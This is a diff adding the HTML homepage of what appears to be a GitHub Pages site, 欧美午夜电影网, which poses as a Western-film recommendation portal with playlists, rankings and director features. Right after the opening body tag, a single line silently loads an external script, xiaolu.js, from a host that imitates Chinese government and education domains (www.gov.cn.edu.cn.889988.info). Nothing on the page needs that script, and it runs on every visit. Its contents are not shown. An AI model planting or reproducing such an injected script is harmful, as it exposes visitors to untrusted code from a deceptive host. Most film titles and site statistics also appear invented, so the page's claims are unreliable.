@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>欧美午夜电影网 - 欧美高分电影推荐、午夜片单与冷门佳片</title>
+<meta name="description" content="欧美午夜电影网(oumeiwuyedianyingwang-wap.github.io)专注欧美电影推荐，提供午夜片单、高分榜单、冷门佳片、导演专题与深度影评，适合深夜独自观看的精选内容。">
+<meta name="keywords" content="欧美午夜电影网,欧美电影,午夜电影,高分电影,冷门佳片,片单推荐,深夜观影">
+<meta name="author" content="欧美午夜电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="欧美午夜电影网 - 欧美高分电影推荐与午夜片单">
+<meta property="og:description" content="专注欧美电影推荐，提供午夜片单、高分榜单、冷门佳片与导演专题。">
+<meta property="og:url" content="https://oumeiwuyedianyingwang-wap.github.io/">
+<meta property="og:site_name" content="欧美午夜电影网">
+<link rel="canonical" href="https://oumeiwuyedianyingwang-wap.github.io/">
+<style>
+:root{
+  --mid:#0b1020;
+  --mid2:#121a33;
+  --mid3:#1b2544;
+  --card:#161f3a;
+  --line:#2a355a;
+  --ink:#e9ecf5;
+  --ink2:#aeb8d4;
+  --muted:#7a86a8;
+  --neon:#00e5ff;
+  --neon2:#7b5cff;
+  --pink:#ff4d8d;
+  --gold:#ffb84d;
+  --serif:"Source Han Serif SC","Noto Serif CJK SC",Georgia,"Songti SC",serif;
+  --sans:"Helvetica Neue","PingFang SC","Microsoft YaHei",Arial,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--mid);
+  color:var(--ink);
+  font-family:var(--sans);
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ===== 顶部条 ===== */
+.topbar{background:#060912;border-bottom:1px solid var(--line);font-size:12px;color:var(--muted)}
+.topbar .inner{display:flex;justify-content:space-between;padding:8px 0;flex-wrap:wrap;gap:10px}
+.topbar a{color:var(--ink2)}
+.topbar a:hover{color:var(--neon)}
+
+/* ===== 报头 ===== */
+header.herohead{position:relative;padding:34px 0 26px;border-bottom:1px solid var(--line);overflow:hidden}
+header.herohead::before{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(circle at 15% 20%,rgba(123,92,255,.35),transparent 45%),
+    radial-gradient(circle at 85% 30%,rgba(0,229,255,.22),transparent 45%),
+    radial-gradient(circle at 50% 90%,rgba(255,77,141,.18),transparent 50%);
+  pointer-events:none;
+}
+header.herohead::after{
+  content:"";position:absolute;inset:0;pointer-events:none;opacity:.25;
+  background-image:linear-gradient(rgba(0,229,255,.07) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,.07) 1px,transparent 1px);
+  background-size:42px 42px;
+}
+.brand-row{position:relative;display:flex;align-items:flex-end;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:16px}
+.logo .glyph{
+  width:64px;height:64px;border:2px solid var(--neon);border-radius:16px;
+  display:grid;place-items:center;font-family:var(--serif);font-size:30px;font-weight:900;color:var(--neon);
+  box-shadow:0 0 18px rgba(0,229,255,.4),inset 0 0 12px rgba(0,229,255,.25);
+}
+.brand h1{font-family:var(--serif);font-size:42px;font-weight:900;letter-spacing:1px;line-height:1.1}
+.brand h1 a{background:linear-gradient(90deg,var(--neon),var(--neon2) 55%,var(--pink));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.brand .sub{font-size:12px;letter-spacing:5px;color:var(--muted);margin-top:6px}
+.head-search{position:relative;flex:1;min-width:240px;max-width:340px}
+.head-search input{
+  width:100%;background:rgba(255,255,255,.06);border:1px solid var(--line);color:var(--ink);
+  padding:11px 44px 11px 14px;border-radius:24px;font-size:14px;font-family:var(--sans);outline:none;
+}
+.head-search input:focus{border-color:var(--neon)}
+.head-search button{position:absolute;right:4px;top:4px;background:var(--neon);color:#04121a;border:none;border-radius:50%;width:32px;height:32px;cursor:pointer;font-size:14px}
+
+/* ===== 导航 ===== */
+nav.tabs{position:sticky;top:0;z-index:50;background:rgba(11,16,32,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+nav.tabs .inner{display:flex;gap:2px;align-items:center;flex-wrap:wrap}
+nav.tabs a{
+  padding:14px 18px;font-size:15px;color:var(--ink2);position:relative;letter-spacing:.5px;
+  border-bottom:2px solid transparent;
+}
+nav.tabs a:hover{color:#fff;background:rgba(255,255,255,.04)}
+nav.tabs a.active{color:var(--neon);border-bottom-color:var(--neon)}
+nav.tabs .live{margin-left:auto;font-size:12px;color:var(--pink);border:1px solid var(--pink);padding:4px 12px;border-radius:20px}
+nav.tabs .live i{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--pink);margin-right:6px;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* ===== 通用区块 ===== */
+section{padding:46px 0}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:26px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:14px}
+.sec-head h2{font-family:var(--serif);font-size:28px;font-weight:900;display:flex;align-items:center;gap:12px}
+.sec-head h2::before{content:"";width:5px;height:26px;background:linear-gradient(var(--neon),var(--neon2));border-radius:3px}
+.sec-head .desc{font-size:13px;color:var(--muted)}
+.sec-head .all{margin-left:auto;font-size:13px;color:var(--neon);border:1px solid var(--line);padding:6px 14px;border-radius:20px}
+.sec-head .all:hover{background:var(--neon);color:#04121a}
+
+/* ===== 栏目一：午夜片单（轮播式） ===== */
+.billboard{display:grid;grid-template-columns:1.7fr 1fr;gap:22px}
+.feature{position:relative;border-radius:18px;overflow:hidden;border:1px solid var(--line);min-height:380px;padding:30px;display:flex;flex-direction:column;justify-content:flex-end}
+.feature .bg{position:absolute;inset:0;z-index:0;
+  background:
+    radial-gradient(circle at 75% 30%,rgba(255,77,141,.5),transparent 55%),
+    linear-gradient(135deg,#2a1140,#0e1830 60%,#07101f);
+}
+.feature .bg::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent 0 59px,rgba(255,255,255,.05) 59px 60px)}
+.feature>*{position:relative;z-index:1}
+.feature .badge{display:inline-block;align-self:flex-start;background:rgba(0,229,255,.15);border:1px solid var(--neon);color:var(--neon);font-size:12px;letter-spacing:2px;padding:4px 12px;border-radius:20px;margin-bottom:16px}
+.feature h3{font-family:var(--serif);font-size:30px;line-height:1.35;font-weight:900;max-width:520px}
+.feature p{margin-top:14px;color:var(--ink2);font-size:15px;max-width:520px}
+.feature .acts{margin-top:22px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{background:var(--neon);color:#04121a;font-weight:700;font-size:14px;padding:11px 22px;border-radius:8px;border:none;cursor:pointer}
+.btn.ghost{background:transparent;border:1px solid var(--neon);color:var(--neon)}
+.mini-list{display:flex;flex-direction:column;gap:12px}
+.mini{border:1px solid var(--line);border-radius:12px;padding:12px 14px;background:var(--card);display:flex;gap:12px;align-items:center;transition:.2s}
+.mini:hover{border-color:var(--neon2);transform:translateX(4px)}
+.mini .num{font-family:var(--serif);font-size:20px;font-weight:900;color:var(--neon2);min-width:32px}
+.mini .txt{font-size:14px}
+.mini .txt small{display:block;color:var(--muted);font-size:12px}
+
+/* ===== 栏目二：高分榜单（横向卡片） ===== */
+.grid5{display:grid;grid-template-columns:repeat(5,1fr);gap:16px}
+.scorecard{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.2s;display:flex;flex-direction:column}
+.scorecard:hover{border-color:var(--gold);transform:translateY(-4px)}
+.thumb{aspect-ratio:2/3;position:relative;overflow:hidden}
+.thumb.a{background:linear-gradient(160deg,#3b1f5a,#0e1830)}
+.thumb.b{background:linear-gradient(160deg,#1f3b5a,#0a1a2e)}
+.thumb.c{background:linear-gradient(160deg,#5a3a1f,#2a1a0a)}
+.thumb.d{background:linear-gradient(160deg,#1f5a4a,#0a2a22)}
+.thumb.e{background:linear-gradient(160deg,#5a1f3a,#2a0a18)}
+.thumb::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent 0 19px,rgba(255,255,255,.06) 19px 20px)}
+.thumb .rt{position:absolute;top:10px;left:10px;background:var(--gold);color:#241a00;font-weight:800;font-size:13px;padding:3px 9px;border-radius:6px}
+.thumb .yr{position:absolute;bottom:10px;right:10px;color:rgba(255,255,255,.7);font-size:12px}
+.scorecard .info{padding:12px 14px;flex:1;display:flex;flex-direction:column}
+.scorecard h4{font-size:16px;font-weight:700;line-height:1.4}
+.scorecard .meta{margin-top:auto;padding-top:10px;font-size:12px;color:var(--muted);display:flex;justify-content:space-between}
+
+/* ===== 栏目三：冷门佳片（杂志式） ===== */
+.mag{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.story{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--card);display:grid;grid-template-columns:140px 1fr}
+.story .pic{background:linear-gradient(135deg,#22305a,#0c1226);position:relative;min-height:180px}
+.story .pic.x{background:linear-gradient(135deg,#3a2240,#160a1c)}
+.story .pic.y{background:linear-gradient(135deg,#22403a,#0a1a16)}
+.story .pic::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent 0 13px,rgba(255,255,255,.05) 13px 14px)}
+.story .pic b{position:absolute;left:12px;bottom:12px;font-family:var(--serif);font-size:15px;color:rgba(255,255,255,.55)}
+.story .body{padding:18px}
+.story .tagline{font-size:11px;letter-spacing:2px;color:var(--pink);text-transform:uppercase}
+.story h4{font-family:var(--serif);font-size:19px;margin:8px 0 10px;line-height:1.4}
+.story p{font-size:13.5px;color:var(--ink2)}
+.story .bar{margin-top:14px;height:5px;border-radius:3px;background:rgba(255,255,255,.08);overflow:hidden}
+.story .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--neon),var(--neon2));border-radius:3px}
+
+/* ===== 栏目四：导演专题（大图文字压图） ===== */
+.director{display:grid;grid-template-columns:1.1fr 1fr;gap:22px}
+.dir-main{border-radius:18px;overflow:hidden;position:relative;min-height:340px;padding:28px;display:flex;flex-direction:column;justify-content:flex-end}
+.dir-main .bg{position:absolute;inset:0;z-index:0;background:radial-gradient(circle at 30% 40%,rgba(0,229,255,.4),transparent 55%),linear-gradient(135deg,#0a1a3a,#1a0a2a)}
+.dir-main>*{position:relative;z-index:1}
+.dir-main h3{font-family:var(--serif);font-size:26px}
+.dir-main h3 em{display:block;font-style:normal;font-size:14px;color:var(--neon);letter-spacing:3px;margin-bottom:8px}
+.dir-main p{color:var(--ink2);font-size:14px;margin-top:10px}
+.dir-main .pick{display:flex;gap:8px;margin-top:18px;flex-wrap:wrap}
+.dir-main .pick span{background:rgba(255,255,255,.1);border:1px solid var(--line);padding:5px 12px;border-radius:20px;font-size:13px}
+.dir-list{display:flex;flex-direction:column;gap:14px}
+.dir-item{border-left:3px solid var(--neon2);padding:4px 0 4px 16px}
+.dir-item h5{font-size:16px;font-weight:700}
+.dir-item p{font-size:13px;color:var(--muted)}
+
+/* ===== 关于 ===== */
+.about{background:linear-gradient(135deg,var(--mid2),var(--mid));border:1px solid var(--line);border-radius:18px;padding:32px}
+.about-grid{display:grid;grid-template-columns:1.3fr 1fr;gap:34px;align-items:center}
+.about h2{font-family:var(--serif);font-size:26px;margin-bottom:16px}
+.about p{color:var(--ink2);font-size:15px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:24px}
+.stat{border:1px solid var(--line);border-radius:12px;padding:16px;text-align:center;background:rgba(255,255,255,.03)}
+.stat b{display:block;font-family:var(--serif);font-size:28px;color:var(--neon)}
+.stat span{font-size:12px;color:var(--muted)}
+.links{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.links a{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;font-size:14px;transition:.2s}
+.links a:hover{border-color:var(--neon);color:var(--neon)}
+.links a small{display:block;color:var(--muted);font-size:12px;margin-top:4px}
+
+/* ===== 页脚 ===== */
+footer{background:#060912;border-top:1px solid var(--line);padding:44px 0 24px;margin-top:20px}
+.foot{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:30px}
+.foot .logo .glyph{width:48px;height:48px;font-size:22px}
+.foot h5{font-size:15px;margin-bottom:14px;color:var(--neon)}
+.foot ul{list-style:none;font-size:13.5px}
+.foot li{padding:5px 0}
+.foot a{color:var(--ink2)}
+.foot a:hover{color:var(--neon)}
+.copyright{margin-top:30px;padding-top:20px;border-top:1px solid var(--line);font-size:12.5px;color:var(--muted);text-align:center;line-height:2}
+.copyright a{color:var(--neon)}
+
+/* ===== 响应式 ===== */
+@media (max-width:980px){
+  .wrap{padding:0 14px}
+  .brand h1{font-size:28px}
+  .billboard,.mag,.director,.about-grid{grid-template-columns:1fr}
+  .grid5{grid-template-columns:1fr 1fr 1fr}
+  .foot{grid-template-columns:1fr 1fr;gap:24px}
+  .feature{min-height:320px;padding:24px}
+  .feature h3{font-size:22px}
+  .head-search{order:3;max-width:none}
+}
+@media (max-width:600px){
+  .brand h1{font-size:23px}
+  .brand .sub{letter-spacing:2px}
+  nav.tabs a{padding:12px 12px;font-size:14px}
+  nav.tabs .live{display:none}
+  .grid5{grid-template-columns:1fr 1fr}
+  .story{grid-template-columns:1fr}
+  .story .pic{min-height:150px}
+  .stats{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr}
+  .sec-head h2{font-size:22px}
+  section{padding:34px 0}
+  .links{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 顶部条 ============ -->
+<div class="topbar">
+  <div class="wrap inner">
+    <span>欢迎来到欧美午夜电影网 · 凌晨档专属片单</span>
+    <span><a href="#about">关于本站</a> · <a href="#">RSS 订阅</a> · <a href="#">APP 下载</a></span>
+  </div>
+</div>
+
+<!-- ============ 报头 ============ -->
+<header class="herohead">
+  <div class="wrap brand-row">
+    <div class="logo">
+      <div class="glyph">欧</div>
+      <div class="brand">
+        <h1><a href="https://oumeiwuyedianyingwang-wap.github.io/" title="欧美午夜电影网">欧美午夜电影网</a></h1>
+        <div class="sub">OUMEI WUYE DIANYINGWANG · MIDNIGHT SELECTION</div>
+      </div>
+    </div>
+    <div class="head-search">
+      <input type="search" placeholder="搜索片名 / 导演 / 演员 / 类型…" aria-label="搜索">
+      <button aria-label="搜索">🔍</button>
+    </div>
+  </div>
+</header>
+
+<!-- ============ 导航 ============ -->
+<nav class="tabs">
+  <div class="wrap inner">
+    <a href="#playlist" class="active">午夜片单</a>
+    <a href="#rank">高分榜单</a>
+    <a href="#hidden">冷门佳片</a>
+    <a href="#director">导演专题</a>
+    <a href="#about">关于我们</a>
+    <span class="live"><i></i>深夜场直播聊片 已开启</span>
+  </div>
+</nav>
+
+<!-- ============ 栏目一：午夜片单 ============ -->
+<section id="playlist">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>午夜片单</h2>
+      <span class="desc">适合 23:00 后独自观看，情绪浓度优先</span>
+      <a href="#" class="all">全部片单 →</a>
+    </div>
+    <div class="billboard">
+      <article class="feature">
+        <div class="bg" aria-hidden="true"></div>
+        <span class="badge">本周主打 · Editor's Pick</span>
+        <h3>《银翼边境》：赛博废土里最后一家通宵影院，藏着一座城市的记忆</h3>
+        <p>我们重新梳理了这部被低估的 2017 年科幻片——它把“看电影”这件事拍成了一种信仰，配乐、布景与剪辑节奏在午夜重看时格外清醒。</p>
+        <div class="acts">
+          <button class="btn">查看完整解析</button>
+          <button class="btn ghost">加入我的片单</button>
+        </div>
+      </article>
+      <aside class="mini-list">
+        <a href="#" class="mini"><span class="num">01</span><span class="txt">《午夜巴黎》式浪漫失灵之后，他拍出了更冷的版本<small>剧情 · 2025 · 评分 8.4</small></span></a>
+        <a href="#" class="mini"><span class="num">02</span><span class="txt">五部让你不敢关灯的悬疑片，全是冷门<small>悬疑 · 合集 · 4.2 万人收藏</small></span></a>
+        <a href="#" class="mini"><span class="num">03</span><span class="txt">诺兰之外的八部时间线神作，烧脑但值得<small>科幻 · 合集 · 3.1 万人收藏</small></span></a>
+        <a href="#" class="mini"><span class="num">04</span><span class="txt">失眠夜伴侣：节奏慢、画面美、不费脑<small>文艺 · 合集 · 2.6 万人收藏</small></span></a>
+        <a href="#" class="mini"><span class="num">05</span><span class="txt">独立恐怖片的十个名字，比大片更吓人<small>恐怖 · 合集 · 1.9 万人收藏</small></span></a>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：高分榜单 ============ -->
+<section id="rank" style="background:linear-gradient(180deg,var(--mid),var(--mid2));">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>高分榜单</h2>
+      <span class="desc">站内编辑与读者双票选，每月更新一次</span>
+      <a href="#" class="all">完整 Top 100 →</a>
+    </div>
+    <div class="grid5">
+      <article class="scorecard">
+        <div class="thumb a"><span class="rt">9.3</span><span class="yr">2024</span></div>
+        <div class="info"><h4>破碎的黄昏</h4><div class="meta"><span>剧情</span><span>美国</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb b"><span class="rt">9.1</span><span class="yr">2023</span></div>
+        <div class="info"><h4>深海回响</h4><div class="meta"><span>惊悚</span><span>英国</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb c"><span class="rt">8.9</span><span class="yr">2025</span></div>
+        <div class="info"><h4>北墙之下</h4><div class="meta"><span>犯罪</span><span>法国</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb d"><span class="rt">8.7</span><span class="yr">2022</span></div>
+        <div class="info"><h4>苔藓与雨</h4><div class="meta"><span>文艺</span><span>爱尔兰</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb e"><span class="rt">8.6</span><span class="yr">2026</span></div>
+        <div class="info"><h4>最后一个夏天</h4><div class="meta"><span>爱情</span><span>意大利</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb b"><span class="rt">8.5</span><span class="yr">2021</span></div>
+        <div class="info"><h4>白夜飞行</h4><div class="meta"><span>剧情</span><span>瑞典</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb c"><span class="rt">8.4</span><span class="yr">2024</span></div>
+        <div class="info"><h4>沉默的成本</h4><div class="meta"><span>悬疑</span><span>美国</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb d"><span class="rt">8.3</span><span class="yr">2023</span></div>
+        <div class="info"><h4>海边诊所</h4><div class="meta"><span>喜剧</span><span>西班牙</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb a"><span class="rt">8.2</span><span class="yr">2025</span></div>
+        <div class="info"><h4>黑镜之外</h4><div class="meta"><span>科幻</span><span>德国</span></div></div>
+      </article>
+      <article class="scorecard">
+        <div class="thumb e"><span class="rt">8.1</span><span class="yr">2022</span></div>
+        <div class="info"><h4>玫瑰与枪</h4><div class="meta"><span>犯罪</span><span>法国</span></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：冷门佳片 ============ -->
+<section id="hidden">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>冷门佳片</h2>
+      <span class="desc">口碑在 8 分以上，却没被算法推给你的电影</span>
+      <a href="#" class="all">更多冷门 →</a>
+    </div>
+    <div class="mag">
+      <article class="story">
+        <div class="pic"><b>EPISODE 01</b></div>
+        <div class="body">
+          <span class="tagline">本周挖掘 · 冰岛</span>
+          <h4>《冰川来信》：整部电影只有两个人，却讲完了孤独的三种形状</h4>
+          <p>拍摄周期 19 天，全程在零下 14 度的冰川边缘完成。没有配乐，全靠风声与脚步声撑起节奏，是近几年最被低估的极简主义作品。</p>
+          <div class="bar"><i style="width:92%"></i></div>
+        </div>
+      </article>
+      <article class="story">
+        <div class="pic x"><b>EPISODE 02</b></div>
+        <div class="body">
+          <span class="tagline">本周挖掘 · 波兰</span>
+          <h4>《钢琴师的房间》：一通打错的电话，改变了两个家庭的二十年</h4>
+          <p>剧本改了七稿，导演最终选择让主角在 78 分钟时说出第一句台词。这种“让画面先说话”的勇气，在大制片体系里几乎绝迹。</p>
+          <div class="bar"><i style="width:88%"></i></div>
+        </div>
+      </article>
+      <article class="story">
+        <div class="pic y"><b>EPISODE 03</b></div>
+        <div class="body">
+          <span class="tagline">本周挖掘 · 葡萄牙</span>
+          <h4>《里斯本雨夜》：一部没有凶手的犯罪片，看完后劲比悬疑片更重</h4>
+          <p>它真正追问的不是“谁做的”，而是“为什么我们都装作没看见”。全片 46 个长镜头，每个镜头都是一次沉默的目击。</p>
+          <div class="bar"><i style="width:85%"></i></div>
+        </div>
+      </article>
+      <article class="story">
+        <div class="pic"><b>EPISODE 04</b></div>
+        <div class="body">
+          <span class="tagline">本周挖掘 · 罗马尼亚</span>
+          <h4>《养老院的海》：养老题材不一定要催泪，它选择了更锋利的方式</h4>
+          <p>一群七十岁以上的非职业演员，贡献了本年度最真实的一组表演。笑点与痛感同时到来，是那种看完想立刻推荐给父母的电影。</p>
+          <div class="bar"><i style="width:90%"></i></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：导演专题 ============ -->
+<section id="director" style="background:linear-gradient(180deg,var(--mid2),var(--mid));">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>导演专题</h2>
+      <span class="desc">一个名字，一条完整的坐标系</span>
+      <a href="#" class="all">全部导演 →</a>
+    </div>
+    <div class="director">
+      <article class="dir-main">
+        <div class="bg" aria-hidden="true"></div>
+        <h3><em>FEATURED DIRECTOR</em>克里斯托弗·诺兰：时间的形状</h3>
+        <p>从《追随》到《奥本海默》，他用三十一年搭出了一条关于时间、记忆与选择的完整路径。我们按“观看顺序”重排了他的十部长片，并标记出被忽略的彩蛋与互文。</p>
+        <div class="pick">
+          <span>《记忆碎片》</span><span>《盗梦空间》</span><span>《星际穿越》</span><span>《信条》</span><span>《奥本海默》</span>
+        </div>
+      </article>
+      <div class="dir-list">
+        <div class="dir-item"><h5>王家卫：色彩的语法</h5><p>四部代表作里的霓虹、雨与慢门，构成一套完整的视觉词典。</p></div>
+        <div class="dir-item"><h5>保罗·托马斯·安德森：群像的密度</h5><p>为什么他镜头里的人物永远在互相试探，却极少真正和解。</p></div>
+        <div class="dir-item"><h5>瑟琳·席安玛：凝视的反转</h5><p>从《水仙花开》到《小妈妈》，她把“谁在看谁”变成了叙事本身。</p></div>
+        <div class="dir-item"><h5>丹尼斯·维伦纽瓦：声音的尺度</h5><p>《降临》《银翼杀手 2049》《沙丘》共享同一套低频语言。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 关于我们 ============ -->
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <div class="sec-head" style="border-bottom-color:var(--line);">
+        <h2>关于欧美午夜电影网</h2>
+        <span class="desc">专注欧美电影推荐的内容站点</span>
+      </div>
+      <div class="about-grid">
+        <div>
+          <h2>为深夜还想看好电影的人，做一个不吵的地方</h2>
+          <p><strong style="color:var(--neon);">欧美午夜电影网</strong>（oumeiwuyedianyingwang-wap.github.io）专注欧美电影推荐，内容覆盖午夜片单、高分榜单、冷门佳片、导演专题与深度影评。我们不做资讯搬运，每一份片单都经过至少两位编辑的独立筛选，并附上“为什么值得在午夜看”的理由。</p>
+          <div class="stats">
+            <div class="stat"><b>1,860</b><span>份原创片单</span></div>
+            <div class="stat"><b>94</b><span>位常驻影评人</span></div>
+            <div class="stat"><b>8.6</b><span>平均推荐评分</span></div>
+          </div>
+        </div>
+        <div class="links">
+          <a href="#playlist">午夜片单<small>情绪浓度优先的每日主推</small></a>
+          <a href="#rank">高分榜单<small>编辑与读者双票选</small></a>
+          <a href="#hidden">冷门佳片<small>算法没推给你的好片</small></a>
+          <a href="#director">导演专题<small>一个名字一条路径</small></a>
+          <a href="#">投稿邮箱<small>editor@oumeiwuyedianyingwang-wap.github.io</small></a>
+          <a href="#">商务合作<small>bd@oumeiwuyedianyingwang-wap.github.io</small></a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo">
+          <div class="glyph">欧</div>
+          <div>
+            <strong style="font-family:var(--serif);font-size:19px;">欧美午夜电影网</strong>
+            <div style="font-size:12px;color:var(--muted);letter-spacing:2px;margin-top:4px;">OUMEI WUYE DIANYINGWANG</div>
+          </div>
+        </div>
+        <p style="font-size:13px;color:var(--ink2);margin-top:14px;max-width:320px;">专注欧美电影推荐：午夜片单、高分榜单、冷门佳片与导演专题。网址 oumeiwuyedianyingwang-wap.github.io</p>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#playlist">午夜片单</a></li>
+          <li><a href="#rank">高分榜单</a></li>
+          <li><a href="#hidden">冷门佳片</a></li>
+          <li><a href="#director">导演专题</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>类型索引</h5>
+        <ul>
+          <li><a href="#">剧情 Drama</a></li>
+          <li><a href="#">科幻 Sci-Fi</a></li>
+          <li><a href="#">悬疑 Thriller</a></li>
+          <li><a href="#">文艺 Arthouse</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于我们</h5>
+        <ul>
+          <li><a href="#about">网站介绍</a></li>
+          <li><a href="#">投稿须知</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">隐私政策</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 欧美午夜电影网 oumeiwuyedianyingwang-wap.github.io 版权所有 · 本站内容仅供欧美电影资讯与观影推荐交流，影片信息以官方公布为准<br>
+      网站名称：<a href="https://oumeiwuyedianyingwang-wap.github.io/">欧美午夜电影网</a> ｜ 网站网址：https://oumeiwuyedianyingwang-wap.github.io/
+    </div>
+  </div>
+</footer>
+</body>
+</html>
